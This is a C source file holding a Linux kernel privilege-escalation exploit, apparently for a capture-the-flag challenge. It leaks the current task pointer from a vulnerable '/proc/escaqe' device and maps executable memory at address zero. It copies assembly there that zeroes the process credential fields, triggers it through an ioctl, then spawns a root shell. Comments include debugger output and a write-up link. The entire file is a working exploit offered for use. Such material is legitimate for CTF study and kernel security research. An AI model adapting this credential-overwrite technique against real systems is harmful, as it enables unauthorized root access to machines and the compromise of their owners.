#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>

int global_fd;
long *current_task;
void *shellcode;

// how to calcuate: https://xarkes.com/b/hacklu-2019-babykernel-wu/
// [r12+0x630] // offset from `current_task` dereferencing to `task_struct`

// other way to find `task_struct->cred` is to find the process name and subtract by 0x18
// pwndbg> search -t string exploit                                                                                           
// Searching for value: b'exploit\x00'                                                                                        
// [pt_ffff888002344] 0xffff888002d2b0a6 0x74696f6c707865 /* 'exploit' */                                                     
// [pt_ffff88800e4b2] 0xffff88800ee1cb78 0x74696f6c707865 /* 'exploit' */                                                     
// [pt_ffffffff82344] 0xffffffff82d2b0a6 0x74696f6c707865 /* 'exploit' */

void spawn_shell()
{
    puts("[+] Hello Userland!");
    int uid = getuid();
    if (uid == 0)
        printf("[+] UID: %d (root poggers)\n", uid);
    else {
        printf("[!] UID: %d (epic fail)\n", uid);
    }

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

void overwrite_cred_uid(){
        __asm__(".intel_syntax noprefix;"
            "mov r14, current_task;"
            "mov r14, [r14+0x630];" // task_struct
            "mov qword ptr [r14+0x4], 0x0;"
            "mov qword ptr [r14+0x8], 0x0;"
            "mov qword ptr [r14+0x10], 0x0;"
            "mov qword ptr [r14+0x18], 0x0;"
            "mov qword ptr [r14+0x20], 0x0;"
            ".att_syntax;");
}

int main(int argc, char *argv[]){
    global_fd = open("/proc/escaqe", O_RDWR);
    if (global_fd < 0){
        perror("open");
        return 1;
    }

    read(global_fd, &current_task, 8);
    printf("[+] current_task pointer: %#lx\n", current_task);

    shellcode = mmap(0x0, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (shellcode < 0x0){
        perror("mmap");
        return 1;
    }

    memcpy(shellcode, &overwrite_cred_uid+0x4, 0x200);

    // trigger shellcode
    ioctl(global_fd, 0x1001, NULL);

    spawn_shell();
}